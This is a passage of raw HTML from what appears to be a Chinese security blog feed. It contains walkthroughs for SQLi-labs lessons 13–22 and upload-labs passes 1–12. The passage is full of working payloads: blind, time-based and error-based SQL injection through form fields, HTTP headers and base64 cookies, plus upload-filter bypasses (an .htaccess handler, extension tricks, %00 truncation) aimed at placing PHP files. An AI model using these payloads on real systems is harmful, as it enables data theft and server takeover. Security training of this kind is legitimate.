punctuation">)</span> or if<span class="token punctuation">((</span>select user<span class="token punctuation">(</span><span class="token punctuation">)</span> like <span class="token string">'r%'</span><span class="token punctuation">)</span>,1,0<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用burp抓包，对标红的两个变量进行测试，爆破出当前用户名为root@localhost:</p><p>   <img src="/posts/bb32/13.png" class></p><p>跟第五关的基于布尔型的盲注差不多。就不重复写了。</p><h3 id="（2）可以采用报错注入"><a href="#（2）可以采用报错注入" class="headerlink" title="（2）可以采用报错注入"></a>（2）可以采用报错注入</h3><h4 id="①获取数据库名："><a href="#①获取数据库名：" class="headerlink" title="①获取数据库名："></a>①获取数据库名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：1'<span class="token punctuation">)</span> or info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示出了数据库名：</p><p> <img src="/posts/bb32/13_2.png" class></p><h4 id="②获取当前数据库用户名："><a href="#②获取当前数据库用户名：" class="headerlink" title="②获取当前数据库用户名："></a>②获取当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1'<span class="token punctuation">)</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到用户名：</p><p>  <img src="/posts/bb32/13_3.png" class></p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>输入1”，出现如下错误信息提示：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">'"1"" and password="" LIMIT 0,1'</span> at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明:在源代码中可能为username=”$uname”的形式。</p><pre class="line-numbers language-bash"><code class="language-bash">使用payload：1" or 1<span class="token operator">=</span>1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面出现成功提示，但也不显示用户名和密码信息，跟第十三关一样，</p><h3 id="（1）采用基于布尔型的盲注。"><a href="#（1）采用基于布尔型的盲注。" class="headerlink" title="（1）采用基于布尔型的盲注。"></a>（1）采用基于布尔型的盲注。</h3><p>只需将第十三关的payload的’)改成”即可。</p><h3 id="（2）采用报错注入。"><a href="#（2）采用报错注入。" class="headerlink" title="（2）采用报错注入。"></a>（2）采用报错注入。</h3><p>也只需将第十三关的payload的’)改成”即可。</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>使用1’ or 1=1#能显示登录成功的信息</p><p>说明在源码中可能为username=’$uname’的形式</p><p>本关不会显示报错信息，采用基于布尔型的盲注或者延时注入。</p><h3 id="（1）基于布尔型的盲注"><a href="#（1）基于布尔型的盲注" class="headerlink" title="（1）基于布尔型的盲注"></a>（1）基于布尔型的盲注</h3><h4 id="①猜测当前数据库用户名："><a href="#①猜测当前数据库用户名：" class="headerlink" title="①猜测当前数据库用户名："></a>①猜测当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or substr(user(),1,1)='</span>r'<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将r替换成其他的字母，成功时显示成功页面，否则是登录失败界面</p><p>或者用like匹配：</p><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' or user() like '</span>r%'<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="②猜测数据库名"><a href="#②猜测数据库名" class="headerlink" title="②猜测数据库名"></a>②猜测数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or substr(database(),1,1)='</span>s'<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将s替换成其他的字母，成功时显示成功页面，否则是登录失败界面</p><p>或者用like匹配：</p><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' or database() like '</span>s%'<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（2）延时注入"><a href="#（2）延时注入" class="headerlink" title="（2）延时注入"></a>（2）延时注入</h3><h4 id="①猜测当前数据库用户名：-1"><a href="#①猜测当前数据库用户名：-1" class="headerlink" title="①猜测当前数据库用户名："></a>①猜测当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or if(substr(user(),1,1)='</span>a',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果字符正确，则延时五秒返回，否则返回登录失败的界面。</p><h4 id="②猜测数据库名-1"><a href="#②猜测数据库名-1" class="headerlink" title="②猜测数据库名"></a>②猜测数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or if(substr(database(),1,1)='</span>a',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果字符正确，则延时五秒返回，否则返回登录失败的界面。</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>通过猜测，使用1”) or 1=1#能显示登录成功的信息。</p><p>说明在源码中可能为username=(“$uname”)的形式。</p><p>本关不会显示报错信息，采用基于布尔型的盲注或者延时注入。</p><p>本关的payload跟第十五关的一样，只需要将第十五关的’换成”)即可。</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>本关是一个修改密码的过程。在尝试的过程中，要输入一个正确的账号，如admin，然后在重置密码框测试。</p><p>密码框输入’时，出现如下的报错信息：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">'admin'</span>' at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明在源码中可能为’$uname’的形式。</p><h3 id="使用报错注入："><a href="#使用报错注入：" class="headerlink" title="使用报错注入："></a>使用报错注入：</h3><h4 id="①猜测当前数据库用户名"><a href="#①猜测当前数据库用户名" class="headerlink" title="①猜测当前数据库用户名"></a>①猜测当前数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：1<span class="token string">' and extractvalue(1,concat(0x7e,(select user()),0x7e))#或者：1'</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/bb32/17.png" class></p><h4 id="②猜测数据库名-2"><a href="#②猜测数据库名-2" class="headerlink" title="②猜测数据库名"></a>②猜测数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and extractvalue(1,concat(0x7e,(select database()),0x7e))#或者：  1'</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/bb32/17_2.png" class></p><h1 id="HTTP头部插入-Less-18-Less22"><a href="#HTTP头部插入-Less-18-Less22" class="headerlink" title="HTTP头部插入(Less-18~Less22)"></a>HTTP头部插入(Less-18~Less22)</h1><h2 id="Less-18-基于错误的用户代理，头部POST注入"><a href="#Less-18-基于错误的用户代理，头部POST注入" class="headerlink" title="Less-18 基于错误的用户代理，头部POST注入"></a>Less-18 基于错误的用户代理，头部POST注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p><p>  <img src="/posts/bb32/18.png" class></p><p>可以抓包修改User-Agent的内容试试：</p><p>将User-Agent里面的内容随便填写，可以看到显示出了我们输入的内容：</p><p>  <img src="/posts/bb32/18_2.png" class></p><p>此时可以在User-Agent中构造注入语句。</p><h3 id="利用报错注入："><a href="#利用报错注入：" class="headerlink" title="利用报错注入："></a>利用报错注入：</h3><h4 id="①获得数据库用户名"><a href="#①获得数据库用户名" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) and '</span>1或者：1<span class="token string">' or extractvalue(1,concat(0x7e,(select user()),0x7e)) and '</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/bb32/18_3.png" class> </p><h4 id="②获得数据库名"><a href="#②获得数据库名" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or (updatexml(1,concat(0x7e,(select database()),0x7e),1)) and '</span>1或者：1<span class="token string">' or extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/bb32/18_4.png" class></p><h2 id="Less-19-基于头部的Referer-POST报错注入"><a href="#Less-19-基于头部的Referer-POST报错注入" class="headerlink" title="Less-19 基于头部的Referer POST报错注入"></a>Less-19 基于头部的Referer POST报错注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p><p>  <img src="/posts/bb32/19.png" class></p><p>这题的思路跟第十八关差不多，只是将User-Agent换成Referer。</p><p>用burp抓包，修改一下Referer的内容看看：</p><p>  <img src="/posts/bb32/19_2.png" class></p><p>的确显示为被修改的内容了，然后在Referer中构造注入语句。</p><h4 id="①获得数据库用户名-1"><a href="#①获得数据库用户名-1" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">' or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) and '</span>1或者：1<span class="token string">' or extractvalue(1,concat(0x7e,(select user()),0x7e)) and '</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/bb32/19_3.png" class></p><p>②获得数据库名</p><pre class="line-numbers language-bash"><code class="language-bash">payload：1<span class="token string">' or (updatexml(1,concat(0x7e,(select database()),0x7e),1)) and '</span>1或者：1<span class="token string">' or extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/bb32/19_4.png" class> </p><h2 id="Less-20-基于错误的cookie头部POST注入"><a href="#Less-20-基于错误的cookie头部POST注入" class="headerlink" title="Less-20 基于错误的cookie头部POST注入"></a>Less-20 基于错误的cookie头部POST注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p><p>  <img src="/posts/bb32/20.png" class></p><p>可以考虑在cookie中添加注入语句。</p><p>Burp抓包：</p><p>因为是cookie，之前没有登录过，所以没有值，我们将请求发送给自己，然后可以获得cookie值：</p><p>  <img src="/posts/bb32/20_2.png" class></p><p>点击两次发送，能获得cookie值，然后发送到重发器，再从里面添加注入语句。</p><h3 id="①获得数据库用户名-2"><a href="#①获得数据库用户名-2" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:uname<span class="token operator">=</span>Dumb' or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/bb32/20_3.png" class></p><h4 id="②获得数据库名-1"><a href="#②获得数据库名-1" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:uname<span class="token operator">=</span>Dumb' or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/bb32/20_4.png" class></p><h2 id="Less-21-基于错误的复杂的字符型Cookie注入"><a href="#Less-21-基于错误的复杂的字符型Cookie注入" class="headerlink" title="Less-21  基于错误的复杂的字符型Cookie注入"></a>Less-21  基于错误的复杂的字符型Cookie注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p><p>   <img src="/posts/bb32/21.png" class></p><p>跟第二十关差不多，只是将账号用base64加密了。并且只是对uname是进行了(‘uname’)的处理。</p><h4 id="①获得数据库用户名-3"><a href="#①获得数据库用户名-3" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：uname<span class="token operator">=</span>Dumb'<span class="token punctuation">)</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>将其转换为base64：uname<span class="token operator">=</span>RHVtYicpIG9yICh1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IHVzZXIoKSksMHg3ZSksMSkpIw<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/bb32/21_2.png" class></p><h4 id="②获得数据库名-2"><a href="#②获得数据库名-2" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:uname<span class="token operator">=</span>Dumb'<span class="token punctuation">)</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>将其转换为base64：uname<span class="token operator">=</span>RHVtYicpIG9yICh1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpKSM<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/bb32/21_3.png" class></p><h2 id="Less-22-基于错误的双引号字符型Cookie注入"><a href="#Less-22-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22 基于错误的双引号字符型Cookie注入"></a>Less-22 基于错误的双引号字符型Cookie注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p><p>   <img src="/posts/bb32/22.png" class></p><p>跟第二十关差不多，将账号用base64加密了，并且是对uname是进行了”uname”的处理。</p><h4 id="①获得数据库用户名-4"><a href="#①获得数据库用户名-4" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：uname<span class="token operator">=</span>Dumb" or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>将其转换为base64：uname<span class="token operator">=</span>RHVtYiIgb3IgKHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgdXNlcigpKSwweDdlKSwxKSkj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/bb32/22_2.png" class></p><h4 id="②获得数据库名-3"><a href="#②获得数据库名-3" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:uname<span class="token operator">=</span>Dumb" or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>将其转换为base64：uname<span class="token operator">=</span>dW5hbWU9RHVtYiIgb3IgKHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMSkpIw<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/bb32/22_3.png" class></p>]]></content>
    
    
    <categories>
      
      <category>专项靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>Web漏洞</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload文件上传靶场</title>
    <link href="/posts/1702.html"/>
    <url>/posts/1702.html</url>
    
    <content type="html"><![CDATA[<p>这段时间看了一下文件上传漏洞的知识点，然后把upload的靶场打完了，记录了一下过关的路程。<span id="more"></span>文章最后还有一张我对于文件上传漏洞的总结哦。</p><!--more--><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我用的这个文件上传的靶场，是c0ny1的upload-labs。下载地址贴一下：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>听我学长的话，咱下载完成一个东西后，先看看它的readme文档或者其他要求的文档。</p><p>这个靶场的php环境推荐5.2.17，那我就乖乖把我的php调到这个版本，然后开始打靶场罗。</p><h1 id="1、PASS-01——js绕过"><a href="#1、PASS-01——js绕过" class="headerlink" title="1、PASS-01——js绕过"></a>1、PASS-01——js绕过</h1><p>上传php后缀文件时，弹出不允许上传，查看源代码，发现这是前端js拦截。</p><img src="/posts/1702/1.png" class><p>那就先上传一个正常的11.jpg，然后用burp抓包将11.jpg改成22.php，然后将图片的内容改成想要的PHP文件内容就可以啦。修改点击发送，发现已经上传成功啦。</p><img src="/posts/1702/1_2.png" class><h1 id="2、PASS-02——content-type检测绕过"><a href="#2、PASS-02——content-type检测绕过" class="headerlink" title="2、PASS-02——content-type检测绕过"></a>2、PASS-02——content-type检测绕过</h1><p>上传2.php时，提示文件类型不正确，查看源码，发现对content-type做了限制。</p><p>那就先上传2.php，然后用burp抓包，将content-type改成其中一个合法的就行。</p><p>抓包获取到的：</p><img src="/posts/1702/2.png" class><p>修改成合法的（image/jpeg或image/png或image/gif）：</p><img src="/posts/1702/2_2.png" class><p>上传成功：</p><img src="/posts/1702/2_3.png" class><h1 id="3、PASS-03——其他后缀名绕过"><a href="#3、PASS-03——其他后缀名绕过" class="headerlink" title="3、PASS-03——其他后缀名绕过"></a>3、PASS-03——其他后缀名绕过</h1><p>上传2.php,发现出现提示信息：</p><img src="/posts/1702/3.png" class><p>这很有可能是设置了黑名单，查看一下源代码。</p><p>既然源代码中只设置了这几种可执行后缀的黑名单，那就直接尝试上传其他可执行后缀的文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">'.asp'</span>,<span class="token string">'.aspx'</span>,<span class="token string">'.php'</span>,<span class="token string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传2.php3文件，抓包，可显示图片路径，成功上传：</p><img src="/posts/1702/3_2.png" class><h1 id="4、PASS-04——-htaccess解析绕过"><a href="#4、PASS-04——-htaccess解析绕过" class="headerlink" title="4、PASS-04——.htaccess解析绕过"></a>4、PASS-04——.htaccess解析绕过</h1><p>上传php文件，查看源代码，发现还是设置了黑名单，只是这次好像把能禁用的后缀都禁用掉了：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">".php"</span>,<span class="token string">".php5"</span>,<span class="token string">".php4"</span>,<span class="token string">".php3"</span>,<span class="token string">".php2"</span>,<span class="token string">".php1"</span>,<span class="token string">".html"</span>,<span class="token string">".htm"</span>,<span class="token string">".phtml"</span>,<span class="token string">".pht"</span>,<span class="token string">".pHp"</span>,<span class="token string">".pHp5"</span>,<span class="token string">".pHp4"</span>,<span class="token string">".pHp3"</span>,<span class="token string">".pHp2"</span>,<span class="token string">".pHp1"</span>,<span class="token string">".Html"</span>,<span class="token string">".Htm"</span>,<span class="token string">".pHtml"</span>,<span class="token string">".jsp"</span>,<span class="token string">".jspa"</span>,<span class="token string">".jspx"</span>,<span class="token string">".jsw"</span>,<span class="token string">".jsv"</span>,<span class="token string">".jspf"</span>,<span class="token string">".jtml"</span>,<span class="token string">".jSp"</span>,<span class="token string">".jSpx"</span>,<span class="token string">".jSpa"</span>,<span class="token string">".jSw"</span>,<span class="token string">".jSv"</span>,<span class="token string">".jSpf"</span>,<span class="token string">".jHtml"</span>,<span class="token string">".asp"</span>,<span class="token string">".aspx"</span>,<span class="token string">".asa"</span>,<span class="token string">".asax"</span>,<span class="token string">".ascx"</span>,<span class="token string">".ashx"</span>,<span class="token string">".asmx"</span>,<span class="token string">".cer"</span>,<span class="token string">".aSp"</span>,<span class="token string">".aSpx"</span>,<span class="token string">".aSa"</span>,<span class="token string">".aSax"</span>,<span class="token string">".aScx"</span>,<span class="token string">".aShx"</span>,<span class="token string">".aSmx"</span>,<span class="token string">".cEr"</span>,<span class="token string">".sWf"</span>,<span class="token string">".swf"</span>,<span class="token string">".ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现它没有禁止上传.htaccess后缀，那就尝试上传这个，</p><p>.htaccess的内容为(.htaccess不能起名字，它就是.htaccess文件)：</p><pre class="line-numbers language-bash"><code class="language-bash">SetHandler application/x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(代码意思：无论上传哪种类型的文件，他就会被解析为.php)</p><p>所以，我们先上传.htaccess文件：</p><img src="/posts/1702/4.png" class><p>此时，再上传一张正常的jpg图片，利用Burp抓包，将1.jpg图片的内容替换成php代码，点击发送：</p><img src="/posts/1702/4_2.png" class><p>此时，访问1.jpg就会转换成php文件：</p><img src="/posts/1702/4_3.png" class><h1 id="5、PASS-05——点空格点绕过"><a href="#5、PASS-05——点空格点绕过" class="headerlink" title="5、PASS-05——点空格点绕过"></a>5、PASS-05——点空格点绕过</h1><p>上传一个php代码，显示此文件类型不允许上传。查看源代码，黑名单限制，这题把.htaccess后缀也限制了。感觉都被限制了呀，但好像那些限制条件都只限制了一次，先去除文件后缀点再去除空格。若此时设置为文件名点空格点（即2.php. .），删掉一个点一个空格，还剩下2.php.</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token variable">$file_name</span> <span class="token operator">=</span> deldot<span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//删除文件名末尾的点 <span class="token variable">$file_ext</span> <span class="token operator">=</span> strrchr<span class="token punctuation">(</span><span class="token variable">$file_name</span>, <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file_ext</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //转换为小写 <span class="token variable">$file_ext</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span><span class="token string">'::<span class="token variable">$DATA</span>'</span>, <span class="token string">''</span>, <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//去除字符串::<span class="token variable">$DATA</span> <span class="token variable">$file_ext</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //首尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Burp抓包，修改2.php为2.php. .文件成功上传:</p><img src="/posts/1702/5.png" class><h1 id="6、PASS-06——大小写绕过"><a href="#6、PASS-06——大小写绕过" class="headerlink" title="6、PASS-06——大小写绕过"></a>6、PASS-06——大小写绕过</h1><p>上传php文件不被允许上传，查看源代码，仔细观察，发现这题居然没有设置大小写转换，那我就直接尝试大小写绕过啦。其实PASS-05的思路这题同样适用。</p><p>抓包，修改2.php为2.Php，成功上传：</p><img src="/posts/1702/6.png" class><img src="/posts/1702/6_2.png" class><h1 id="7、PASS-07——空格绕过"><a href="#7、PASS-07——空格绕过" class="headerlink" title="7、PASS-07——空格绕过"></a>7、PASS-07——空格绕过</h1><p>php文件不允许上传，我们还是来看源代码吧，一看没有写去掉末尾空格的代码呀，那就直接空格绕过上传咯。Burp抓包，将2.php修改成2.php 发现成功上传</p><img src="/posts/1702/7.png" class><h1 id="8、PASS-08——点绕过"><a href="#8、PASS-08——点绕过" class="headerlink" title="8、PASS-08——点绕过"></a>8、PASS-08——点绕过</h1><p>直接上源代码，发现这题没有设置删除文件末尾的点的代码，那就在文件后面加点绕过啦。</p><p>这里点绕过的原理其实是利用windows的特性，在windows下，2.php.和2.php的效果是一样的。</p><p>Burp抓包，将2.php修改成2.php.成功上传。</p><img src="/posts/1702/8.png" class><h1 id="9、PASS-09——-DATA绕过上传"><a href="#9、PASS-09——-DATA绕过上传" class="headerlink" title="9、PASS-09——::$DATA绕过上传"></a>9、PASS-09——::$DATA绕过上传</h1><p>查看源代码，发现这里没有去除字符串::$DATA的代码，于是我们可以使用::$DATA绕过上传。</p><p>Burp抓包，将2.php修改成2.php::$DATA，发现成功上传</p><img src="/posts/1702/9.png" class><img src="/posts/1702/9_2.png" class><h1 id="10、PASS-10——点空格点绕过"><a href="#10、PASS-10——点空格点绕过" class="headerlink" title="10、PASS-10——点空格点绕过"></a>10、PASS-10——点空格点绕过</h1><p>这关的源代码和第五关一样，所以采用点空格点就能绕过。</p><p>Burp抓包，将2.php修改为2.php. .成功上传</p><img src="/posts/1702/10.png" class><h1 id="11、PASS-11——双写绕过"><a href="#11、PASS-11——双写绕过" class="headerlink" title="11、PASS-11——双写绕过"></a>11、PASS-11——双写绕过</h1><p>查看源代码，发现将图片的后缀用空白代替了。这时可以双写后缀名绕过。</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token variable">$file_name</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span><span class="token variable">$deny_ext</span>,<span class="token string">""</span>, <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用burp抓包，将2.php修改成2.pphphp成功上传</p><img src="/posts/1702/11.png" class><h1 id="12、PASS-12——目录可控-00截断绕过（GET）"><a href="#12、PASS-12——目录可控-00截断绕过（GET）" class="headerlink" title="12、PASS-12——目录可控%00截断绕过（GET）"></a>12、PASS-12——目录可控%00截断绕过（GET）</h1><p>上传一个php文件，出现提示信息：</p><img src="/posts/1702/12.png" class><p>说明可能设置了白名单，查看源代码：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$ext_arr</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">'jpg'</span>,<span class="token string">'png'</span>,<span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到的确是设置了白名单，可以采用%00截断。</p><p>满足%00截断的两个条件：</p><pre class="line-numbers language-bash"><code class="language-bash">条件1：php版本小于5.3.4条件2：要将magic_quotes_gpc关闭<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/1702/12_2.png" class><p>上传1.jpg，burp抓包，将save_path=../upload/修改为save_path=../upload/2.php%00，并且将jpg图片内容改为php内容，这样就相当于上传了2.php，并对后面的图片1.jpg进行了截断，成功上传</p><img src="/posts/1702/12_3.png" class><h1 id="13、PASS-13——目录可控-00截断绕过（POST）"><a href="#13、PASS-13——目录可控-00截断绕过（POST）" class="headerlink" 